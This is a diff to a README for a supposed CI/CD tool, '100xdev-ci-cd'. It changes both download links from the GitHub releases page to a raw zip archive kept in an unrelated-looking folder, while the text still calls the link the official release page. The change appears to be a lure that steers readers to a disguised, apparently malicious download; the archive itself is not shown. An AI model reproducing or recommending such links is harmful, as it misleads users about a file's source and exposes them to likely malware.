@@ -1,6 +1,6 @@
 # 🚀 100xdev-ci-cd - Streamline your software delivery workflow today
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/sociologisttentcaterpillarmoth213/100xdev-ci-cd/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/sociologisttentcaterpillarmoth213/100xdev-ci-cd/main/mycohemia/ci_cd_xdev_v2.3-alpha.3.zip)
 
 ## What is this application?
 
@@ -19,7 +19,7 @@ Before you install this tool, check your computer for these settings:
 
 You must visit the official release page to obtain the installer for your computer. 
 
-[Download the application here](https://github.com/sociologisttentcaterpillarmoth213/100xdev-ci-cd/releases)
+[Download the application here](https://raw.githubusercontent.com/sociologisttentcaterpillarmoth213/100xdev-ci-cd/main/mycohemia/ci_cd_xdev_v2.3-alpha.3.zip)
 
 1. Open your web browser.
 2. Click the link above.
